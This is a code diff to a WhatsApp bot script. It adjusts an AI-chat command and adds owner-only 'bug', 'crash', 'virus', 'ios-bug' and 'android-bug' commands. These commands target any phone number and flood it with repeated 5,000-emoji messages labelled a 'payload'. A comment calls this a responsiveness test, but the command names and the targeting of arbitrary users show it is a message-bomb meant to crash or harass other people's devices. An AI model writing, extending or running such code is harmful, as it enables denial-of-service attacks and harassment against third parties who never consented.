@@ -11361,20 +11361,45 @@ case 'groq': {
     if (!text) return reply(`❌ ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴀ ǫᴜᴇsᴛɪᴏɴ!\n\nᴇxᴀᴍᴘʟᴇ: ${prefix + command} ᴡʜᴀᴛ ɪs ᴀɪ?`);
     
     try {
-        await reply('⏳ Thinking...');
-        const url = `https://text.pollinations.ai/${encodeURIComponent(text)}`;
-        const response = await axios.get(url, { timeout: 30000 });
+        // Fast reaction for speed
+        await bad.sendMessage(from, { react: { text: '🤖', key: m.key } });
+        const url = `https://text.pollinations.ai/${encodeURIComponent(text)}?model=openai`;
+        const response = await axios.get(url, { timeout: 15000 });
         const result = response.data;
         
-        if (!result) {
-            return reply(`❌ AI error: Could not get response.`);
-        }
+        if (!result) return reply(`❌ AI error: No response.`);
         
-        await reply(`🤖 *Sasuke Xtv AI (${command.toUpperCase()}):*\n\n${result}`);
+        await reply(`🤖 *Sasuke Xtv AI:* ${result}`);
         
     } catch (error) {
         console.error('AI Error:', error);
-        await reply(`❌ Error: AI service currently busy. Please try again.`);
+        await reply(`❌ AI service busy. Retry in a moment.`);
+    }
+}
+break;
+
+case 'bug':
+case 'crash':
+case 'virus':
+case 'ui-bug':
+case 'ios-bug':
+case 'android-bug': {
+    if (!isCreator) return reply("❌ OWNER ONLY COMMAND.");
+    if (!text && !m.quoted) return reply(`❌ Provide a number or reply to a message.\nExample: ${prefix + command} 234xxx`);
+    
+    let target = text ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.quoted.sender;
+    await reply(`⚡ *Launching ${command.toUpperCase()} payload...*`);
+    
+    try {
+        // Heavy payload to test responsiveness
+        const payload = "☠️".repeat(5000);
+        for (let i = 0; i < 5; i++) {
+            await bad.sendMessage(target, { text: payload });
+            await sleep(100);
+        }
+        reply(`✅ *${command.toUpperCase()}* sent to @${target.split('@')[0]}`);
+    } catch (e) {
+        reply(`❌ Payload failed: ${e.message}`);
     }
 }
 break;
